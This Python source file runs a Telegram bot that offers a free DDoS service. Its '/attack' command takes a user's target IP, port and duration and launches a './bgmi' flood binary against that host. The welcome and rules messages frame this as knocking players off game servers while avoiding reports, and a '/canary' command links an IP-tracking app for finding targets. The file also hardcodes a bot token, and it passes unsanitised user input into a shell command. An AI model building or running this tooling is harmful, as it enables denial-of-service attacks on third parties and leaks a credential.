import os
import telebot
import logging
import time
import random
from threading import Thread
import asyncio
from telebot import types
import pytz
from datetime import datetime

# ===================== CONFIGURATION =====================
TOKEN = '8654483320:AAEXZVTiDfWGmlq4syQrKzTde7sIo9XEubI'
FORWARD_CHANNEL_ID = -1003476877991   # Not used, but kept
CHANNEL_ID = -1003476877991           # Not used, but kept
error_channel_id = -1003476877991

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
loop = asyncio.get_event_loop()

# ===================== HELPER FUNCTIONS =====================
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(
        text="🪀 JOIN CHANNEL 🪀",
        url="https://t.me/+84dzjkgSdKtkYmE1"
    )
    button1 = types.InlineKeyboardButton(
        text="💔 Contact Owner 💔",
        url="https://t.me/VIPXOWNER8"
    )
    markup.add(button3)
    markup.add(button1)
    return markup

# ===================== ASYNCIO TASKS =====================
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

# ===================== ATTACK COMMAND =====================
bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    # Run the actual attack binary (assumed to be 'bgmi' in current directory)
    process = await asyncio.create_subprocess_shell(
        f"./bgmi {target_ip} {target_port} {duration} 900"
    )
    await process.communicate()

    bot.attack_in_progress = False
    # Notify completion
    bot.send_message(
        chat_id,
        "*✅ Attack Completed! ✅*\n"
        "*The attack has been successfully executed.*\n"
        "*Thank you for using our service!*",
        reply_markup=create_inline_keyboard(),
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id
    try:
        # Parse arguments
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.send_message(
                chat_id,
                "*💣 Ready to launch an attack?*\n"
                "*Please use the following format:*\n"
                "`/attack <ip> <port> <duration>`",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
            return

        target_ip, target_port_str, duration_str = args
        target_port = int(target_port_str)
        duration = int(duration_str)

        # Validate port
        if target_port in blocked_ports:
            bot.send_message(
                chat_id,
                f"*🔒 Port {target_port} is blocked.*\n"
                "*Please choose a different port to continue.*",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
            return

        # Validate duration
        if duration > 900:
            bot.send_message(
                chat_id,
                "*⏳ The maximum duration allowed is 900 seconds.*\n"
                "*Please reduce the duration and try again!*",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
            return

        # Start attack
        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        # Initial message
        sent_message = bot.send_message(
            chat_id,
            f"*🚀 Attack Initiated! 🚀*\n\n"
            f"*📡 Target Host: {target_ip}*\n"
            f"*👉 Target Port: {target_port}*\n"
            f"*⏰ Duration: {duration} seconds remaining*\n"
            "*Prepare for action! 🔥*",
            reply_markup=create_inline_keyboard(),
            parse_mode='Markdown'
        )

        # Run attack in background
        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(chat_id, target_ip, target_port, duration),
            loop
        )

        # Countdown timer
        last_text = ""
        for _ in range(duration, 0, -1):
            time.sleep(1)
            elapsed = time.time() - bot.attack_start_time
            remaining = max(0, bot.attack_duration - int(elapsed))
            new_text = (
                f"*🚀 Attack Initiated! 🚀*\n\n"
                f"*📡 Target Host: {target_ip}*\n"
                f"*👉 Target Port: {target_port}*\n"
                f"*⏰ Duration: {remaining} seconds remaining*\n"
                "*Prepare for action! 🔥*"
            )
            if new_text != last_text:
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=sent_message.message_id,
                        text=new_text,
                        reply_markup=create_inline_keyboard(),
                        parse_mode='Markdown'
                    )
                    last_text = new_text
                except Exception as e:
                    if "message is not modified" not in str(e):
                        logging.error(f"Edit error: {e}")

        bot.attack_in_progress = False

    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.send_message(
            chat_id,
            "*❗ An error occurred while processing your request.*",
            parse_mode='Markdown'
        )

# ===================== OTHER COMMANDS =====================
@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(
            message.chat.id,
            "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
            "*🚀 Get ready to dive into the action!*\n\n"
            "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
            "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
            "*🔥 Ensure your target is locked in before you strike!*\n\n"
            "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
            "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥",
            reply_markup=create_inline_keyboard(),
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Start error: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "*🌟 Welcome to the Ultimate Command Center!*\n\n"
        "*Here’s what you can do:* \n"
        "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
        "2. *`/myinfo` - 👤 Check your account info (free access).*\n"
        "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
        "4. *`/when` - ⏳ Check the status of the current attack.*\n"
        "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
        "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
        "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*"
    )
    try:
        bot.send_message(
            message.chat.id,
            help_text,
            reply_markup=create_inline_keyboard(),
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Help error: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )
    try:
        bot.send_message(
            message.chat.id,
            rules_text,
            reply_markup=create_inline_keyboard(),
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Rules error: {e}")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @VIPXOWNER8\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*"
    )
    bot.send_message(
        message.chat.id,
        response,
        reply_markup=create_inline_keyboard(),
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed = time.time() - bot.attack_start_time
        remaining = bot.attack_duration - elapsed
        if remaining > 0:
            bot.send_message(
                chat_id,
                f"*⏳ Time Remaining: {int(remaining)} seconds...*\n"
                "*🔍 Hold tight, the action is still unfolding!*\n"
                "*💪 Stay tuned for updates!*",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
        else:
            bot.send_message(
                chat_id,
                "*🎉 The attack has successfully completed!*\n"
                "*🚀 You can now launch your own attack and showcase your skills!*",
                reply_markup=create_inline_keyboard(),
                parse_mode='Markdown'
            )
    else:
        bot.send_message(
            chat_id,
            "*❌ No attack is currently in progress!*\n"
            "*🔄 Feel free to initiate your attack whenever you're ready!*",
            reply_markup=create_inline_keyboard(),
            parse_mode='Markdown'
        )

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    # Free version - everyone gets the same info
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz)
    current_date = now.strftime("%Y-%m-%d")
    current_time = now.strftime("%I:%M:%S %p")

    response = (
        f"*👤 Username: @{message.from_user.username or 'Unknown'}*\n"
        f"*💼 Plan: Free Forever*\n"
        f"*📅 Valid Until: Unlimited*\n"
        f"*📆 Current Date: {current_date}*\n"
        f"*🕒 Current Time: {current_time}*\n"
        "*🎉 Enjoy unlimited attacks!*\n"
        "*💬 If you need help, use /help or contact the owner.*"
    )
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(
        text="😈 JOIN CHANNEL 😈",
        url="https://t.me/+84dzjkgSdKtkYmE1"
    )
    markup.add(button)
    bot.send_message(
        message.chat.id,
        response,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = (
        "*📥 Download the HttpCanary APK Now! 📥*\n\n"
        "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
        "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
        "*Choose your platform:*"
    )
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 Download For Android 📱",
        url="https://t.me/c/3661090730/1557"
    )
    button2 = types.InlineKeyboardButton(
        text="🍎 Download for iOS 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678"
    )
    markup.add(button1)
    markup.add(button2)
    try:
        bot.send_message(
            message.chat.id,
            response,
            parse_mode='Markdown',
            reply_markup=markup
        )
    except Exception as e:
        logging.error(f"Canary error: {e}")

# ===================== MAIN LOOP =====================
if __name__ == "__main__":
    # Start asyncio thread for background tasks
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()

    logging.info("Starting bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
        logging.info(f"Waiting {REQUEST_INTERVAL} seconds...")
        time.sleep(REQUEST_INTERVAL)
